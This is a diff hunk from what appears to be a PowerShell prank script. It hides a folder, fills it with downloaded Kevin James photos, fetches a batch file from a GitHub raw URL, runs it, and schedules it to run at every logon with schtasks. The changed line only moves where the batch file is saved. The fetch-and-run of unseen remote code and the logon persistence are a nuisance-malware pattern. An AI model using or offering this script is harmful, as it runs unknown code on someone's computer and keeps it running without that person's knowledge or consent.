@@ -7,7 +7,7 @@ attrib +h C:\Kevin_James
 (new-object System.Net.WebClient).Downloadfile("https://pmcdeadline2.files.wordpress.com/2016/05/kevin-james.jpg","C:\Kevin_James\5.jpg")
 (new-object System.Net.WebClient).Downloadfile("https://media.brstatic.com/2017/05/04120310/kevin-james-net-worth.jpg","C:\Kevin_James\6.jpg")
 (new-object System.Net.WebClient).Downloadfile("https://i.pinimg.com/originals/3f/a8/ea/3fa8ea55ea6802c8ce13d449fdaa25a9.jpg","C:\Kevin_James\7.jpg")
-(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/Kevin_James.bat","C:\Kevin_James\Microsoft\Windows\Start Menu\Programs\Startup\Kevin_James.bat")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/Kevin_James.bat","C:\Kevin_James\Kevin_James.bat")
 Start-Process -FilePath C:\Kevin_James\Kevin_James.bat
 schtasks /create /tn Kevin_James /tr C:\Kevin_James\Kevin_James.bat /sc onlogon
 
